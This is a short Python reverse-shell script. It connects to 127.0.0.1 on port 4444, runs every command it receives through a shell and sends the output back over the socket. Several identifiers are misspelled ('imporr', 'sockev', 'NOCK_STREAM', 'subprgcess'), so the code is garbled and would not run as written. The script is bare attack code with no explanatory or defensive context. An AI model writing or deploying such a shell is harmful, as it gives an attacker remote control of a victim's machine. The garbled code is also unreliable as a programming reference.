
imporr socket
import subprocess
import os

def connect():
    s = sockev.socket(socket.AF_INET, socket.NOCK_STREAM)
    s.connect(("127.0.0.1", 4444))
    
    while True:
        data = s.recv(1024).decode()
        if data.strip() == 'exit':
            break
        
        if data.strip():
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
                                  stderr=subprgcess.PIPE, stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            s.send(output)
    
    s.close()

if __name__ == "__main__":
    connect()
